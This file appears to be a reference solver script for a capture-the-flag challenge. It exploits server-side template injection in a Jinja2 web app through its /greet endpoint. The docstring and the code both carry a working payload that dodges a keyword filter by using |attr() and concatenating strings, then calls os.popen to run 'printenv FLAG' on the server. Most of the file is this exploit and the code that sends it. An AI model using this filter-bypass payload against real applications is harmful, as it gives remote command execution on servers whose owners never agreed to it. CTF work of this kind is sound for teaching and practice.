"""Reference solver for ssti: bypass the filter and RCE via Jinja2.

    python3 solve.py <host> <port>

The filter blocks '.' and words like os/popen/globals/class. Reach attributes
with |attr() and split the blocked words with string concatenation:

    {{ lipsum|attr('__glo'+'bals__')|attr('__getitem'+'__')('o'+'s')
             |attr('po'+'pen')('printenv FL'+'AG')|attr('re'+'ad')() }}
"""
import json
import re
import sys
import urllib.parse
import urllib.request


def main():
    host, port = sys.argv[1], sys.argv[2]
    base = f"http://{host}:{port}"
    payload = ("{{ lipsum|attr('__glo'+'bals__')|attr('__getitem'+'__')('o'+'s')"
               "|attr('po'+'pen')('printenv FL'+'AG')|attr('re'+'ad')() }}")
    q = base + "/greet?name=" + urllib.parse.quote(payload, safe="")
    data = json.loads(urllib.request.urlopen(q, timeout=15).read())
    result = data.get("result", "")
    m = re.search(r"flag\{[^}]*\}", result)
    print(m.group(0) if m else result)


if __name__ == "__main__":
    main()
